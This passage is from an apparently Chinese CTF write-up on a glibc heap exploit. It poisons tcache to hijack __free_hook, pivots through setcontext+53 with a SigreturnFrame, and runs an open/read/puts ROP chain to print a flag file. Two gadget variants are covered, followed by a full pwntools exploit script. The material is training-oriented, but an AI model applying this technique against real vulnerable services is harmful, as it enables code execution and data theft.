<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span><span class="c1">#free_hook</span>
</pre></div>
<p>在我们劫持完free_hook之后，向free_hook里面填入这个gadget，gadget之后放上我们的rop链。我们先定义一些数据位置</p>
<div class="highlight"><pre><span></span><span class="n">payload_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">payload_addr</span> <span class="o">+</span> <span class="mh">0x100</span>
<span class="n">frame_addr</span> <span class="o">=</span> <span class="n">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span>
</pre></div>
<p>因为payload就放在free_hook及其后面的位置，所以这里直接就是free_hook的地址,然后这个buf其实填的是flag字符串，从free_hook一直到buf里面都放上我们的rop链，然后为了减少长度，我们的SigreturnFrame结构体可以完成open的功能</p>
<div class="highlight"><pre><span></span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'open'</span><span class="p">]</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">buf_addr</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span> 
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rsi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdx; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'read'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'./flag</span><span class="se">\x00</span><span class="s1">'</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">frame_addr</span> <span class="o">-</span> <span class="n">payload_addr</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
</pre></div>
<p>到这里，算是完成的基本的布局，最后两行是要填充到frame结构体的位置，然后我们先把free_hook改写成我们的payload，把某个堆的数据改写成setcontext+53加上frame结构体地址，free掉它</p>
<div class="highlight"><pre><span></span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'setcontext'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">53</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">frame_addr</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div>
<p>我们跟着gdb看看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235257-b9db7384-8268-1.png"/></p>
<p>在我们执行free的时候，我们会先跳转到free_hook，执行放free_hook里面的gadget，这个时候的rdi里面就是我们放在堆里面的数据，也就是setcontext+53，然后执行mov    rdx, qword ptr [rdi + 8]，要注意的是，这个时候的[rdi+8]里面放的是frame结构体的地址，这个时候的rdx里面就放上了这个地址，其实就相当于完成了从rdi到rdx的转变</p>
<p>然后执行mov    rax, qword ptr [rdi]，这一句直接把setcontext+53放进了rax里面，因为后面会call rax，相当于call setcontext+53</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235318-c5fb824e-8268-1.png"/></p>
<p>可以看到，我们会跳转到这里执行，这个时候的rdx就是frame结构体的地址，执行完setcontext之后，会按照frame结构体，接着执行open，read和puts函数，拿到我们的flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235339-d2c67e66-8268-1.png"/></p>
<h3 data-content="1" id="212fcc0a5aad6a0b12044fa2aa44fcdc">gadget2</h3>
<p>那么对应gadget2，其实是一样的思路，前面就不放了，并且写法都相同，要注意的就是我们需要修改frame结构体，需要对其进行类型转换，转换成字节数组，才可以对其进行修改，在ljust到0x100之后，填充如下数据</p>
<div class="highlight"><pre><span></span><span class="n">frame</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
<span class="n">frame</span><span class="p">[</span><span class="mh">0x20</span><span class="p">:</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'setcontext'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">53</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">frame</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">frame_addr</span><span class="p">))</span>
<span class="n">free</span><span class="err">（</span><span class="mi">1</span><span class="err">）</span>
</pre></div>
<p>我们来gdb看一下这个gadget，第一句是一样的，从第二句开始，执行mov    qword ptr [rsp], rax，这个时候的rax是我们上一句gadget的地址，这一句没有任何影响，重点看下一句，call   qword ptr [rdx + 0x20]，这个时候的rdx里面放的是我们的p64(frame_addr)，加上0x20的位置被我们改成了setcontext+53，然后就和上面相同，依次执行open，read和puts</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235400-def24666-8268-1.png"/><br/>
最终可以拿到flag</p>
<p>附上完整代码（前半部分的逆向就不再重复了）</p>
<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7F</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3b6be0</span>
<span class="n">info</span><span class="p">(</span><span class="s2">"libc base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span><span class="c1">#free_hook</span>

<span class="n">payload_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">payload_addr</span> <span class="o">+</span> <span class="mh">0x100</span>
<span class="n">frame_addr</span> <span class="o">=</span> <span class="n">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span>

<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'open'</span><span class="p">]</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">buf_addr</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span> 
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rsi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdx; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'read'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'./flag</span><span class="se">\x00</span><span class="s1">'</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">frame_addr</span> <span class="o">-</span> <span class="n">payload_addr</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="sd">'''</span>
<span class="sd">frame = bytearray(bytes(frame))</span>
<span class="sd">frame[0x20:0x20 + 8] = p64(libc.sym['setcontext'] + 53)</span>
<span class="sd">payload += frame</span>
<span class="sd">edit(0, payload)</span>
<span class="sd">edit(1, p64(0)+ p64(frame_addr))</span>

<span class="sd">gdb.attach(io, "b __libc_free\nc")</span>
<span class="sd">free(1)</span>
<span class="sd">这里注意改写payload的第一行</span>
<span class="sd">'''</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'setcontext'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">53</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">frame_addr</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div>
<p>除了setcontext+53之外，部分gadget是setcontext+61，这一点需要注意</p>
</div>
</div>